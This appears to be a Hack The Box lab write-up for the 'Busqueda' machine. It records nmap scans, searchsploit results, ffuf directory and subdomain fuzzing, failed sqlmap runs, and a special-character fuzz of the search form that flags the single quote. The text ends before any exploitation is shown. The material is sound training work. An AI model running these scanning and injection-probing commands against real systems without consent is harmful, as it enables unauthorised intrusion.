# Busqueda - HTB Easy

## Setup

```
exegol start htb_busqueda nightly --vpn /home/yanis/Downloads/lab_nisya.ovpn
```

```
~/.exegol/my-resources/bin# git clone https://github.com/tmux-plugins/tpm.git
tmux new -s local
/opt/my-resources/bin/tpm/tpm
tmux source /opt/my-resources/setup/tmux/tmux.conf

tmux capture-pane -pS - > tmux_history.log
```



## Nmap

```
nmap -sC -sV -oA nmap 10.10.11.208  --stats-every=5s
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-09 19:02 CEST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 19:02 (0:00:06 remaining)
Nmap scan report for 10.10.11.208
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.94 seconds
```

### New nmap after added search.htb to /etc/hosts

```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-09 19:19 CEST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 19:19 (0:00:06 remaining)
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Searchsploit&#x20;

### Apache 2.4 (nothing)

```
searchsploit apache 2.4   
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                              |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                                                                                                                                                                                            | linux/webapps/42745.py
Apache 2.2.4 - 413 Error HTTP Request Method Cross-Site Scripting                                                                                                                                                                           | unix/remote/30835.sh
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                                                                                                                                       | linux/local/46676.php
Apache 2.4.17 - Denial of Service                                                                                                                                                                                                           | windows/dos/39037.php
Apache 2.4.23 mod_http2 - Denial of Service                                                                                                                                                                                                 | linux/dos/40909.py
Apache 2.4.7 mod_status - Scoreboard Handling Race Condition                                                                                                                                                                                | linux/dos/34133.txt
Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memory Code Execution                                                                                                                                                             | php/remote/40142.php
Apache 2.4.x - Buffer Overflow                                                                                                                                                                                                              | multiple/webapps/51193.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                                                                                                                                                                         | multiple/dos/26710.txt
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                                                                                                                                                                    | multiple/webapps/50383.sh
Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)                                                                                                                                                                    | multiple/webapps/50406.sh
Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (2)                                                                                                                                                                                 | multiple/webapps/50446.sh
Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)                                                                                                                                                                                 | multiple/webapps/50512.py
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                                                                                        | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                                                                                  | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                                                                                  | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                                                                                                                                                                         | linux/webapps/39642.txt
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                                                                                                                                                                             | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                                                                                                                                                                           | php/remote/29316.py
Apache Shiro 1.2.4 - Cookie RememberME Deserial RCE (Metasploit)                                                                                                                                                                            | multiple/remote/48410.rb
Apache Tomcat 3.2.3/3.2.4 - Example Files Web Root Full Path Disclosure                                                                                                                                                                     | multiple/remote/21491.txt
Apache Tomcat 3.2.3/3.2.4 - 'RealPath.jsp' Information Disclosuree                                                                                                                                                                          | multiple/remote/21492.txt
Apache Tomcat 3.2.3/3.2.4 - 'Source.jsp' Information Disclosure                                                                                                                                                                             | multiple/remote/21490.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                                                                                                                                                                           | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                                                                                                                                                                                   | multiple/remote/6229.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                                                                                                                                                                         | unix/remote/14489.c
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                                                                                                | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                                                                                                | jsp/webapps/42966.py
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                                                                                                                                                                                | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                                                                                                                            | linux/remote/34.pl
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

### Werkzeug (nothing)

```
searchsploit werkzeug
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                              |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Pallets Werkzeug 0.15.4 - Path Traversal                                                                                                                                                                                                    | python/webapps/50101.py
Werkzeug - Debug Shell Command Execution (Metasploit)                                                                                                                                                                                       | python/remote/37814.rb
Werkzeug - 'Debug Shell' Command Execution                                                                                                                                                                                                  | multiple/remote/43905.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

### Flask (nothing)

```
searchsploit flask                                                                   
Exploits: No Results
Shellcodes: No Results

```



## Fuzzing

### Page Fuzzing (only /search page founded)

````
```log
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://searcher.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://searcher.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 22ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 31ms]
# directory-list-2.3-small.txt [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 36ms]
#                       [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 41ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 44ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 44ms]
# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 49ms]
search                  [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 55ms]
# on at least 3 different hosts [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 55ms]
#                       [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 49ms]
                        [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 55ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 57ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 71ms]
#                       [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 71ms]
# Copyright 2007 James Fisher [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 79ms]
:: Progress: [32525/87664] :: Job [1/1] :: 301 req/sec :: Duration: [0:01:25] :: Errors: 0 ::^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^
                        [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 103ms]
:: Progress: [87664/87664] :: Job [1/1] :: 346 req/sec :: Duration: [0:04:04] :: Errors: 0 ::
```
````

#### Browse founded page and HTTP Verb Tampering (nothing)

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Subdomain fuzzing (nothing)

```
ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.searcher.htb/                                                                                                        


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.searcher.htb/
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 23 req/sec :: Duration: [0:02:37] :: Errors: 4989 ::
```

### Vhost Fuzzing (nothing)

```
ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://searcher.htb/ -H 'Host: FUZZ.searcher.htb' -fc 302


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://searcher.htb/
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.searcher.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 1754 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

### Extension fuzzing

```
ffuf -w /opt/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://searcher.htb/indexFUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://searcher.htb/indexFUZZ
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [41/41] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

### Directory fuzzing (nothing)

```
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://searcher.htb/FUZZ/   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://searcher.htb/FUZZ/
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# This work is licensed under the Creative Commons [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 27ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 29ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 36ms]
#                       [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 44ms]
# Copyright 2007 James Fisher [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 49ms]
# on at least 3 different hosts [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 49ms]
#                       [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 53ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 56ms]
# directory-list-2.3-small.txt [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 68ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 68ms]
                        [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 68ms]
# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 69ms]
#                       [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 71ms]
#                       [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 78ms]
                        [Status: 200, Size: 13519, Words: 3904, Lines: 430, Duration: 96ms]
:: Progress: [87664/87664] :: Job [1/1] :: 313 req/sec :: Duration: [0:04:11] :: Errors: 0 ::
```

## Sqlmap

### /search on engine and query parameters (Failed)

```
sqlmap 'http://searcher.htb/search' --data 'engine=Accuweather&query=a'
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.2.1#dev}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:22:56 /2024-10-12/

[07:22:56] [INFO] testing connection to the target URL
[07:22:56] [INFO] checking if the target is protected by some kind of WAF/IPS
[07:22:56] [INFO] testing if the target URL content is stable
[07:22:57] [INFO] target URL content is stable
[07:22:57] [INFO] testing if POST parameter 'engine' is dynamic
[07:22:57] [INFO] POST parameter 'engine' appears to be dynamic
[07:22:57] [WARNING] heuristic (basic) test shows that POST parameter 'engine' might not be injectable
[07:22:57] [INFO] testing for SQL injection on POST parameter 'engine'
[07:22:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:22:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:22:58] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[07:22:58] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:22:58] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[07:22:58] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[07:22:58] [INFO] testing 'Generic inline queries'
[07:22:58] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:22:59] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[07:22:59] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[07:22:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:22:59] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[07:22:59] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[07:23:00] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[07:23:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[07:23:07] [WARNING] POST parameter 'engine' does not seem to be injectable
[07:23:07] [INFO] testing if POST parameter 'query' is dynamic
[07:23:07] [INFO] POST parameter 'query' appears to be dynamic
[07:23:07] [WARNING] heuristic (basic) test shows that POST parameter 'query' might not be injectable
[07:23:07] [INFO] testing for SQL injection on POST parameter 'query'
[07:23:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:23:08] [WARNING] reflective value(s) found and filtering out
[07:23:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:23:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[07:23:10] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:23:11] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[07:23:12] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[07:23:13] [INFO] testing 'Generic inline queries'
[07:23:13] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:23:14] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[07:23:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[07:23:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:23:17] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[07:23:18] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[07:23:19] [INFO] testing 'Oracle AND time-based blind'
[07:23:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[07:23:21] [WARNING] POST parameter 'query' does not seem to be injectable
[07:23:21] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[07:23:21] [WARNING] your sqlmap version is outdated

[*] ending @ 07:23:21 /2024-10-12/

```

```
sqlmap -r req_searcher.txt 
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.2.1#dev}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 07:27:37 /2024-10-12/

[07:27:37] [INFO] parsing HTTP request from 'req_searcher.txt'
[07:27:37] [INFO] testing connection to the target URL
[07:27:38] [INFO] testing if the target URL content is stable
[07:27:38] [INFO] target URL content is stable
[07:27:38] [INFO] testing if POST parameter 'engine' is dynamic
[07:27:38] [INFO] POST parameter 'engine' appears to be dynamic
[07:27:38] [WARNING] heuristic (basic) test shows that POST parameter 'engine' might not be injectable
[07:27:38] [INFO] testing for SQL injection on POST parameter 'engine'
[07:27:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:27:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:27:39] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[07:27:39] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:27:40] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[07:27:40] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[07:27:40] [INFO] testing 'Generic inline queries'
[07:27:40] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:27:40] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[07:27:40] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[07:27:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:27:41] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[07:27:41] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[07:27:41] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[07:27:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[07:27:49] [WARNING] POST parameter 'engine' does not seem to be injectable
[07:27:49] [INFO] testing if POST parameter 'query' is dynamic
[07:27:49] [INFO] POST parameter 'query' appears to be dynamic
[07:27:50] [WARNING] heuristic (basic) test shows that POST parameter 'query' might not be injectable
[07:27:50] [INFO] testing for SQL injection on POST parameter 'query'
[07:27:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:27:51] [WARNING] reflective value(s) found and filtering out
[07:27:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[07:27:52] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[07:27:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[07:27:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[07:27:55] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[07:27:56] [INFO] testing 'Generic inline queries'
[07:27:56] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[07:27:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[07:27:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[07:27:58] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:27:59] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[07:28:00] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[07:28:01] [INFO] testing 'Oracle AND time-based blind'
[07:28:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[07:28:12] [WARNING] POST parameter 'query' does not seem to be injectable
[07:28:12] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[07:28:12] [WARNING] your sqlmap version is outdated

[*] ending @ 07:28:12 /2024-10-12/

```

### /search on engine , query and autoRedirect parameters (failed)

```
sqlmap 'http://searcher.htb/search' --data 'engine=Apple&query=iphone&auto_redirect='

[08:53:33] [WARNING] POST parameter 'auto_redirect' does not seem to be injectable
[08:53:33] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
```

## Fuzzing special characters

```
cat req-fuzz.req
                                                                                                                                                                                                
POST /search HTTP/1.1                                                                                                                                                                                                                                                         
Host: searcher.htb                                                                                                                                                                                                                                                            
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0                                                                                                                                                                                           
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8                                                                                                                                                                                 
Accept-Language: en-US,en;q=0.5                                                                                                                                                                                                                                               
Accept-Encoding: gzip, deflate, br                                                                                                                                                                                                                                            
Content-Type: application/x-www-form-urlencoded                                                                                                                                                                                                                               
Content-Length: 23                                                                                                                                                                                                                                                            
Origin: http://searcher.htb                                                                                                                                                                                                                                                   
Connection: close                                                                                                                                                                                                                                                             
Referer: http://searcher.htb/                                                                                                                                                                                                                                                 
Upgrade-Insecure-Requests: 1                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                              
engine=UPS&query=iphoneFUZZ#                                
```

```
ffuf -request req-fuzz.req -request-proto http -w /opt/seclists/Fuzzing/special-chars.txt                                                                                                                       
                                                                                                                                                                                                                                                                              
        /'___\  /'___\           /'___\                                                                                                                                                                                                                                       
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                                                                                                       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                                                                                                      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                                                                                                      
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                                                                                                       
          \/_/    \/_/   \/___/    \/_/                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                                              
       v2.1.0-dev                                                                                                                                                                                                                                                             
________________________________________________                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                                              
 :: Method           : POST                                                                                                                                                                                                                                                   
 :: URL              : http://searcher.htb/search                                                                                                                                                                                                                             
 :: Wordlist         : FUZZ: /opt/seclists/Fuzzing/special-chars.txt                                                                                                                                                                                                          
 :: Header           : Accept-Language: en-US,en;q=0.5                                                                                                                                                                                                                        
 :: Header           : Accept-Encoding: gzip, deflate, br                                                                                                                                                                                                                     
 :: Header           : Connection: close                                                                                                                                                                                                                                      
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0                                                                                                                                                                    
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8                                                                                                                                                          
 :: Header           : Content-Type: application/x-www-form-urlencoded                                                                                                                                                                                                        
 :: Header           : Origin: http://searcher.htb                                                                                                                                                                                                                            
 :: Header           : Referer: http://searcher.htb/                                                                                                                                                                                                                          
 :: Header           : Upgrade-Insecure-Requests: 1                                                                                                                                                                                                                           
 :: Header           : Host: searcher.htb                                                                                                                                                                                                                                     
 :: Data             : engine=UPS&query=iphoneFUZZ                                                                                                                                                                                                                            
 :: Follow redirects : false                                                                                                                                                                                                                                                  
 :: Calibration      : false                                                                                                                                                                                                                                                  
 :: Timeout          : 10                                                                                                                                                                                                                                                     
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

+                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2113ms]
/                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2130ms]
?                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2164ms]
:                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2180ms]
]                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2228ms]
!                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2228ms]
@                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2278ms]
{                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2294ms]
'                       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2306ms]
*                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2306ms]
#                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2309ms]
$                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2324ms]
"                       [Status: 200, Size: 56, Words: 1, Lines: 1, Duration: 2340ms]
